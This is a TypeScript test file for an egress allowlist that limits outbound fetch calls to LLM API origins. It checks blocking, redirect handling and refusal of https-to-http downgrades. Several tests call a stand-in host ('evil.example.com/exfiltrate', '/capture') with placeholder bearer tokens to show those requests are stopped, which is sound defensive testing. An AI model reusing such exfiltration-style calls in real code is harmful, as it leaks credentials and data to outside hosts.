import { afterEach, describe, expect, it } from "bun:test";
import { originOf, withEgressAllowlist } from "../../src/runtime/doctor/egress";

const originalFetch = globalThis.fetch;

afterEach(() => {
  // Guard against a leaked swap if an assertion throws mid-region.
  // eslint-disable-next-line unicorn/no-global-object-property-assignment
  globalThis.fetch = originalFetch;
});

describe("originOf", () => {
  it("extracts the scheme+host+port origin from a base URL", () => {
    expect(originOf("https://api.anthropic.com/v1")).toBe(
      "https://api.anthropic.com",
    );
  });
});

// Install a stub `original` fetch that answers each URL from a script, so both
// the allowlist and the redirect-following logic can be exercised offline.
const stubFetch = (responder: (url: string) => Response): string[] => {
  const seen: string[] = [];
  // eslint-disable-next-line unicorn/no-global-object-property-assignment
  globalThis.fetch = Object.assign(
    async (input: Parameters<typeof fetch>[0]) => {
      const url = String(input);
      seen.push(url);
      return responder(url);
    },
    { preconnect: originalFetch.preconnect },
  );
  return seen;
};

const redirect = (location: string): Response =>
  new Response(null, { status: 302, headers: { location } });

const ANTHROPIC = "https://api.anthropic.com";
const GOOD = "https://good.example.com";

describe("withEgressAllowlist", () => {
  it("permits and records a request to an allowlisted origin", async () => {
    const seen = stubFetch(() => new Response("ok"));
    const trace = await withEgressAllowlist([ANTHROPIC], async () => {
      const response = await fetch(`${ANTHROPIC}/v1/messages`);
      return response.text();
    });
    expect(trace.result).toBe("ok");
    expect(trace.contactedHosts).toEqual(["api.anthropic.com"]);
    expect(trace.violations).toEqual([]);
    expect(seen).toEqual([`${ANTHROPIC}/v1/messages`]);
  });

  it("blocks and records a request to a non-allowlisted host", async () => {
    const seen = stubFetch(() => new Response("should not happen"));
    let thrown: unknown;
    const trace = await withEgressAllowlist([ANTHROPIC], async () => {
      try {
        await fetch("https://evil.example.com/exfiltrate");
      } catch (error) {
        thrown = error;
      }
      return "done";
    });
    expect(seen).toEqual([]);
    expect((thrown as Error).message).toContain("evil.example.com");
    expect(trace.violations).toEqual(["evil.example.com"]);
    expect(trace.contactedHosts).toEqual(["evil.example.com"]);
  });

  it("blocks a plaintext http hop to an https LLM host, key uncarried", async () => {
    // The allowlist is by ORIGIN: http://<same-host> is a different origin
    // (scheme, and port 80 vs 443), so a downgrade to plaintext is refused
    // before the request — and the Authorization header — ever leaves.
    // eslint-disable-next-line unicorn/prefer-https
    const httpUrl = "http://api.anthropic.com/capture";
    const seen = stubFetch(() => new Response("captured"));
    let thrown: unknown;
    const trace = await withEgressAllowlist([ANTHROPIC], async () => {
      try {
        await fetch(httpUrl, { headers: { authorization: "Bearer secret" } });
      } catch (error) {
        thrown = error;
      }
      return "done";
    });
    expect(seen).toEqual([]);
    expect((thrown as Error).message).toContain(
      "outside the LLM-only allowlist",
    );
    expect(trace.violations).toEqual(["api.anthropic.com"]);
  });

  it("restores the original fetch after the region", async () => {
    await withEgressAllowlist([ANTHROPIC], async () => "noop");
    expect(globalThis.fetch).toBe(originalFetch);
  });

  it("restores the original fetch even when the region throws", async () => {
    await expect(
      withEgressAllowlist([ANTHROPIC], async () => {
        throw new Error("region failure");
      }),
    ).rejects.toThrow("region failure");
    expect(globalThis.fetch).toBe(originalFetch);
  });

  it("blocks and records a redirect to a non-allowlisted host", async () => {
    const seen = stubFetch((url) =>
      url.includes("start")
        ? redirect("https://evil.example.com/capture")
        : new Response("captured")
    );
    const trace = await withEgressAllowlist([GOOD], async () => {
      try {
        await fetch(`${GOOD}/start`);
      } catch { /* surfaced below */ }
      return "done";
    });
    expect(trace.violations).toEqual(["evil.example.com"]);
    expect(trace.contactedHosts).toContain("good.example.com");
    expect(trace.contactedHosts).toContain("evil.example.com");
    expect(seen.some((url) => url.includes("evil.example.com"))).toBe(false);
  });

  it("follows a redirect that stays on the allowlisted origin", async () => {
    const seen = stubFetch((url) =>
      url.endsWith("/start") ? redirect(`${GOOD}/next`) : new Response("final")
    );
    const trace = await withEgressAllowlist([GOOD], async () => {
      const response = await fetch(`${GOOD}/start`);
      return response.text();
    });
    expect(trace.result).toBe("final");
    expect(trace.violations).toEqual([]);
    expect(seen).toEqual([`${GOOD}/start`, `${GOOD}/next`]);
  });

  it("blocks a same-host redirect that downgrades https to http", async () => {
    // eslint-disable-next-line unicorn/prefer-https
    const httpTarget = "http://good.example.com/capture";
    const seen = stubFetch((url) =>
      url.startsWith("https://")
        ? redirect(httpTarget)
        : new Response("captured")
    );
    let thrown: unknown;
    const trace = await withEgressAllowlist([GOOD], async () => {
      try {
        await fetch(`${GOOD}/start`, {
          headers: { authorization: "Bearer sk-secret-value" },
        });
      } catch (error) {
        thrown = error;
      }
      return "done";
    });
    expect((thrown as Error).message).toContain(
      "outside the LLM-only allowlist",
    );
    expect(trace.violations).toEqual(["good.example.com"]);
    // The plaintext http hop never happened, so the key was never sent over it.
    expect(seen.some((url) => url.startsWith("http://"))).toBe(false);
  });

  it("stops a redirect loop with a clear error", async () => {
    stubFetch(() => redirect(`${GOOD}/loop`));
    let thrown: unknown;
    await withEgressAllowlist([GOOD], async () => {
      try {
        await fetch(`${GOOD}/start`);
      } catch (error) {
        thrown = error;
      }
      return "done";
    });
    expect((thrown as Error).message).toContain("too many redirects");
  });
});
